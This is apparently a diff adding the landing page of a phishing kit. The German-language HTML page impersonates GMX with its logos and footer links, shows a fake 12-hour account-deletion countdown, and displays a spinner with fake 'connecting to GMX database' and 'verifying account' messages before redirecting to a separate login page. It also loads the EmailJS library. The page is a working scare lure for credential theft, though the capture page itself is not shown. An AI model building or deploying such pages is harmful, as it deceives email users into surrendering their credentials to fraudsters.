@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GMX Login</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem GMX-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="mv.css">
+    
+    <style>
+        /* Apply blur effect to the login container only */
+        .loginn-container.blur {
+            filter: blur(8px);  /* Apply blur effect */
+            pointer-events: none;  /* Prevent interaction with the login form while blurred */
+            opacity: 0.6;  /* Optionally reduce opacity to make it more subtle */
+        }
+
+        /* Spinner container */
+        #spinner-container {
+            display: none;  /* Hidden by default */
+            position: fixed;  /* Fixed positioning to stay above the content */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            font-family: 'Roboto Condensed', sans-serif;
+            z-index: 9999;  /* Make sure it appears above other content */
+            opacity: 0;  /* Initially hidden */
+            transition: opacity 0.3s ease;  /* Smooth fade-in/fade-out effect */
+            
+            /* Use flexbox to stack the spinner and text vertically */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* New Spinner Styles */
+.spinner {
+    border: 8px solid #f3f3f3;  /* Light gray border */
+    border-top: 8px solid #3498db; /* Blue border for spinning effect */
+    border-radius: 50%;  /* Ensure it is round */
+    width: 100px;  /* Increased size */
+    height: 100px;  /* Increased size */
+    animation: spin 1.5s linear infinite;  /* Faster spin animation */
+}
+
+/* Spinner spin animation */
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Spinner text */
+#spinner-container p {
+    margin-top: 15px;  /* Adjust space between spinner and text */
+    color: #3498db;  /* Matching blue color */
+    font-size: 20px;  /* Slightly smaller text */
+    font-weight: bold;  /* Bold text */
+    text-transform: uppercase;  /* Uppercase letters */
+    letter-spacing: 1px;  /* Increase spacing between letters */
+    animation: pulse 1.5s ease-in-out infinite;  /* Pulse animation for text */
+}
+
+/* Pulse animation for text */
+@keyframes pulse {
+    0% {
+        transform: scale(1);
+        opacity: 1;
+    }
+    50% {
+        transform: scale(1.1);
+        opacity: 0.8;
+    }
+    100% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="GMX Logo" class="logo">
+            <span class="account-text">Mein Account</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="loginn-container">
+            <img src="/static/images/1.svg" alt="GMX Logo" class="formlogoo">
+            
+            <form id="login-form" action="/login" method="POST">
+                <p>Ihr Konto soll gelöscht werden, wenn der Countdown abgelaufen ist. Danach werden alle Ihre Daten und Kontoinformationen dauerhaft aus unserem System entfernt und können nicht wiederhergestellt werden.</p>
+                
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <!-- CAPTCHA image/icon here -->
+                        </div>
+                        <div class="captcha-background">
+                            <div class="captchaa-text">Dieses Konto wird gelöscht in:</div>
+                            <div id="countdown-timer" class="captcha-timer">
+                                <div id="hours" class="time-unit">
+                                    <span class="label1"></span>
+                                    <span class="time-value">12</span>
+                                </div>
+                                <div id="minutes" class="time-unit">
+                                    <span class="label1"></span>
+                                    <span class="time-value">30</span>
+                                </div>
+                                <div id="seconds" class="time-unit">
+                                    <span class="label1"></span>
+                                    <span class="time-value">45</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="captcha-links">
+                        <a href="login.html" id="no-delete" class="no-delete">Dies ist ein Fehler, löschen Sie mein Konto nicht</a>
+                        <a href="#" id="delete" class="delete">Konto sofort löschen</a>
+                    </div>
+                </div> 
+            </form>
+        </div>
+        
+        <!-- Spinner and text that will be shown during the delay (outside of loginn-container) -->
+        <div id="spinner-container">
+            <div class="spinner"></div>
+            <p>Verbindung zur GMX.DE-Datenbank wird hergestellt..</p>
+            <p>Ihr GMX.DE-Konto wird überprüft..</p>
+        </div>
+        
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+
+    <script>
+       // Show spinner and apply blur effect
+document.getElementById('no-delete').addEventListener('click', function(event) {
+    event.preventDefault();  // Prevent default behavior
+    const loginContainer = document.querySelector('.loginn-container');
+    const spinnerContainer = document.getElementById('spinner-container');
+
+    // Show spinner and apply blur effect
+    spinnerContainer.style.display = 'flex';  // Show the spinner using flexbox
+    spinnerContainer.style.opacity = 1;
+    loginContainer.classList.add('blur');
+
+    // Apply fade-in effect to spinner
+    setTimeout(function() {
+        spinnerContainer.classList.add('fade-in'); // Fade in the spinner
+    }, 6);
+
+    // Show first text "Connecting to database..." for 4 seconds
+    const connectingText = spinnerContainer.querySelector('p:first-of-type'); // "Connecting to database..."
+    const verifyingText = spinnerContainer.querySelector('p:last-of-type'); // "Verifying your account..."
+
+    connectingText.style.display = 'block';
+    verifyingText.style.display = 'none';  // Hide verifying text initially
+
+    setTimeout(function() {
+        connectingText.style.display = 'none';  // Hide "Connecting to database..."
+        verifyingText.style.display = 'block';  // Show "Verifying your account..."
+    }, 4000); // Switch to second text after 4 seconds
+
+    // Redirect to login.html after another 4 seconds (total 8 seconds)
+    setTimeout(function() {
+        window.location.href = 'login.html';  // Redirect to login.html
+    }, 8000);
+
+    // After 8 seconds, hide the spinner and remove the blur effect
+    setTimeout(function() {
+        spinnerContainer.classList.remove('fade-in');
+        setTimeout(function() {
+            spinnerContainer.style.display = 'none';  // Hide the spinner completely
+            loginContainer.classList.remove('blur');  // Remove the blur effect
+        }, 300);  // Wait for the fade-out effect
+    }, 8000); // Hide after 8 seconds
+});
+
+// Countdown Timer Script
+document.addEventListener('DOMContentLoaded', function() {
+    // Function to format the remaining time
+    function formatTimeComponent(time) {
+        return time.toString().padStart(2, '0');
+    }
+
+    // Set or get the end time from localStorage
+    function setEndTime() {
+        const currentTime = new Date().getTime();
+        const endTime = currentTime + 12 * 60 * 60 * 1000; // 12 hours from now
+        localStorage.setItem('captchaEndTime', endTime);
+        return endTime;
+    }
+
+    // Check if we have an existing end time and if it is expired
+    function getEndTime() {
+        const storedEndTime = localStorage.getItem('captchaEndTime');
+        if (storedEndTime) {
+            const currentTime = new Date().getTime();
+            if (currentTime > storedEndTime) {
+                // If time expired, reset the end time
+                return setEndTime();
+            }
+            return parseInt(storedEndTime, 10);
+        }
+        // If no stored end time, set one
+        return setEndTime();
+    }
+
+    // Update the countdown timer every second
+    function updateCountdown() {
+        const endTime = getEndTime();
+        const currentTime = new Date().getTime();
+        const remainingTime = Math.max(0, endTime - currentTime); // Make sure we don't get negative time
+
+        // Calculate hours, minutes, and seconds
+        const hours = Math.floor(remainingTime / 3600000);
+        const minutes = Math.floor((remainingTime % 3600000) / 60000);
+        const secondsLeft = Math.floor((remainingTime % 60000) / 1000);
+
+        // Update each part of the countdown individually
+        document.getElementById('hours').textContent = formatTimeComponent(hours);
+        document.getElementById('minutes').textContent = formatTimeComponent(minutes);
+        document.getElementById('seconds').textContent = formatTimeComponent(secondsLeft);
+
+        // If countdown has finished, clear the timer
+        if (remainingTime === 0) {
+            clearInterval(countdownInterval);
+        }
+    }
+
+    // Initial countdown update
+    updateCountdown();
+
+    // Update countdown every second
+    const countdownInterval = setInterval(updateCountdown, 1000);
+});
+
+        
+                </script>
+                
+            <script src="../static/js/script.js"></script>
+    <script src="js.js"></script>
+    
+</body>
+</html>
